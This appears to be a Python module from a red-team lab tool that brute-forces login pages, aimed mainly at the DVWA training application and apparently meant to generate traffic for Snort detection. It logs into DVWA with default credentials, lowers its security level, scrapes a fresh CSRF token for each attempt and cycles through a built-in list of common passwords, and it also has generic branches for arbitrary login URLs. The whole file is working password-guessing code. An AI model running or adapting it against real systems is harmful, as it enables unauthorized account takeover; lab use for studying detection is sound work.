"""
Brute Force Attack Module
Generates REAL HTTP traffic with CSRF token handling for DVWA
"""
import time
import requests
from datetime import datetime
import re
from bs4 import BeautifulSoup

class BruteForceAttack:
    def __init__(self, target, parameters):
        self.target = target
        self.parameters = parameters
        self.username = parameters.get('username', 'admin')
        self.wordlist = parameters.get('wordlist', [])
        self.max_attempts = parameters.get('max_attempts', 50)
        self.aborted = False
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'RedTeam-BruteForce/1.0'})
        self.csrf_token = None
        self.results = {
            'attempts': 0,
            'success': False,
            'credentials_found': None,
            'failed_attempts': []
        }
        
        # Comprehensive wordlist
        if not self.wordlist:
            self.wordlist = [
                'password',
                '123456',
                'admin',
                'password123',
                'admin123',
                '12345678',
                'qwerty',
                'letmein',
                'welcome',
                'monkey',
                'abc123',
                'Password1',
                'iloveyou',
                '1234567890'
            ]
    
    def execute(self):
        """Execute brute force attack"""
        yield {
            'message': f'🚀 Starting REAL Brute Force attack on {self.target}',
            'progress': 0,
            'status': 'initializing',
            'attempts': 0
        }
        
        # Determine target type
        is_dvwa = '/vulnerabilities/brute' in self.target or 'dvwa' in self.target.lower()
        is_login_page = 'login.php' in self.target
        
        if is_dvwa:
            yield {
                'message': '🎯 Target: DVWA Brute Force page (with CSRF protection)',
                'progress': 5,
                'status': 'detected'
            }
            
            # Authenticate with DVWA first
            auth_success = self._authenticate_dvwa()
            if auth_success:
                yield {
                    'message': '🔑 DVWA session established',
                    'progress': 10,
                    'status': 'authenticated'
                }
            else:
                yield {
                    'message': '⚠️ Could not authenticate with DVWA - attack may fail',
                    'progress': 10,
                    'status': 'warning'
                }
        elif is_login_page:
            yield {
                'message': '🎯 Target: Login page',
                'progress': 5,
                'status': 'detected'
            }
        
        time.sleep(0.3)
        
        total_attempts = min(len(self.wordlist), self.max_attempts)
        
        for i, password in enumerate(self.wordlist[:self.max_attempts]):
            if self.aborted:
                yield {'message': 'Attack aborted', 'status': 'aborted'}
                break
            
            self.results['attempts'] = i + 1
            
            yield {
                'message': f'🔑 Attempting: {self.username} / {password}',
                'progress': 10 + int((i + 1) / total_attempts * 80),
                'status': 'trying',
                'username': self.username,
                'password': password,
                'attempts': i + 1
            }
            
            try:
                # Send REAL HTTP request (generates traffic for Snort)
                success = self._send_login_attempt(password, is_dvwa, is_login_page)
                
                if success:
                    self.results['success'] = True
                    self.results['credentials_found'] = {
                        'username': self.username,
                        'password': password,
                        'timestamp': datetime.now().isoformat(),
                        'method': 'brute_force',
                        'attempts_required': i + 1,
                        'target_type': 'DVWA' if is_dvwa else 'Login Page'
                    }
                    
                    yield {
                        'message': f'✅ SUCCESS! Valid credentials found: {self.username} / {password}',
                        'progress': 100,
                        'status': 'success',
                        'credentials': self.results['credentials_found'],
                        'attempts': i + 1
                    }
                    break
                else:
                    self.results['failed_attempts'].append({
                        'username': self.username,
                        'password': password,
                        'timestamp': datetime.now().isoformat()
                    })
                    
                    if (i + 1) % 5 == 0:
                        yield {
                            'message': f'⚠️ {i + 1} failed login attempts - continuing',
                            'progress': 10 + int((i + 1) / total_attempts * 80),
                            'status': 'warning',
                            'attempts': i + 1
                        }
            
            except Exception as e:
                print(f"[DEBUG] Error during attempt: {e}")
                yield {
                    'message': f'❌ Error: {str(e)[:50]}',
                    'progress': 10 + int((i + 1) / total_attempts * 80),
                    'status': 'error',
                    'attempts': i + 1
                }
            
            time.sleep(0.5)  # Realistic delay between attempts
        
        if not self.results['success']:
            yield {
                'message': f'❌ No valid credentials found after {self.results["attempts"]} attempts',
                'progress': 100,
                'status': 'failed',
                'attempts': self.results['attempts']
            }
    
    def _authenticate_dvwa(self):
        """Authenticate with DVWA to get session"""
        try:
            # Extract base URL
            if '/vulnerabilities/' in self.target:
                base_url = self.target.split('/vulnerabilities/')[0]
            else:
                base_url = self.target.rstrip('/')
            
            # Get login page
            response = self.session.get(f"{base_url}/login.php", timeout=5)
            
            # Login
            login_data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login'
            }
            response = self.session.post(f"{base_url}/login.php", data=login_data, timeout=5)
            
            # Set security to low
            self.session.get(f"{base_url}/security.php?security=low&seclev_submit=Submit", timeout=5)
            
            print("[DEBUG] DVWA session established")
            return True
            
        except Exception as e:
            print(f"[DEBUG] DVWA auth failed: {e}")
            return False
    
    def _get_csrf_token(self):
        """Extract CSRF token from DVWA brute force page"""
        try:
            response = self.session.get(self.target, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for user_token input
            token_input = soup.find('input', {'name': 'user_token'})
            if token_input:
                token = token_input.get('value')
                print(f"[DEBUG] CSRF token found: {token[:20]}...")
                return token
            
            # Alternative: search in HTML
            match = re.search(r"user_token'\s*value='([^']+)'", response.text)
            if match:
                token = match.group(1)
                print(f"[DEBUG] CSRF token found via regex: {token[:20]}...")
                return token
            
            print("[DEBUG] No CSRF token found")
            return None
            
        except Exception as e:
            print(f"[DEBUG] Error getting CSRF token: {e}")
            return None
    
    def _send_login_attempt(self, password, is_dvwa, is_login_page):
        """Send REAL HTTP request with credentials - WITH CSRF HANDLING"""
        try:
            if is_dvwa:
                # Get fresh CSRF token for each attempt
                csrf_token = self._get_csrf_token()
                
                # DVWA Brute Force page uses GET parameters
                params = {
                    'username': self.username,
                    'password': password,
                    'Login': 'Login'
                }
                
                # Add CSRF token if available
                if csrf_token:
                    params['user_token'] = csrf_token
                
                # Send REAL GET request (generates HTTP traffic)
                response = self.session.get(
                    self.target,
                    params=params,
                    timeout=5
                )
                
                # Check response
                print(f"[DEBUG] Sent GET with password={password}, status={response.status_code}")
                
                # Check for success indicators
                response_lower = response.text.lower()
                
                # DVWA shows "welcome to the password protected area" on success
                if 'welcome to the password protected area' in response_lower:
                    print(f"[DEBUG] SUCCESS! Found valid password: {password}")
                    return True
                
                # Also check for absence of "username and/or password incorrect"
                if 'username and/or password incorrect' not in response_lower and \
                   'login failed' not in response_lower:
                    # Might be success
                    if len(response.text) > 1000:  # Successful page is typically longer
                        print(f"[DEBUG] Possible success with password: {password}")
                        return True
                
                return False
                
            elif is_login_page:
                # Login page uses POST
                login_data = {
                    'username': self.username,
                    'password': password,
                    'Login': 'Login'
                }
                
                # Send REAL POST request (generates HTTP traffic)
                response = self.session.post(
                    self.target,
                    data=login_data,
                    timeout=5,
                    allow_redirects=False
                )
                
                print(f"[DEBUG] Sent POST with password={password}, status={response.status_code}")
                
                # Check for redirect (successful login)
                if response.status_code in [301, 302]:
                    location = response.headers.get('Location', '')
                    if 'index.php' in location or 'login.php' not in location:
                        return True
                
                # Check response content
                if 'welcome' in response.text.lower() or 'logout' in response.text.lower():
                    return True
                
                # Check for absence of error messages
                if 'incorrect' not in response.text.lower() and \
                   'failed' not in response.text.lower():
                    return True
                
                return False
            
            else:
                # Generic target
                params = {
                    'username': self.username,
                    'password': password,
                    'Login': 'Login'
                }
                
                # Try GET
                response = self.session.get(self.target, params=params, timeout=5)
                print(f"[DEBUG] Sent GET to {self.target}, status={response.status_code}")
                
                # Generic success detection
                if response.status_code == 200 and 'error' not in response.text.lower():
                    return True
                
                return False
                
        except requests.exceptions.Timeout:
            print(f"[DEBUG] Request timeout for password={password}")
            return False
        except Exception as e:
            print(f"[DEBUG] Request error: {e}")
            return False
    
    def get_results(self):
        """Get attack results"""
        return self.results
    
    def abort(self):
        """Abort the attack"""
        self.aborted = True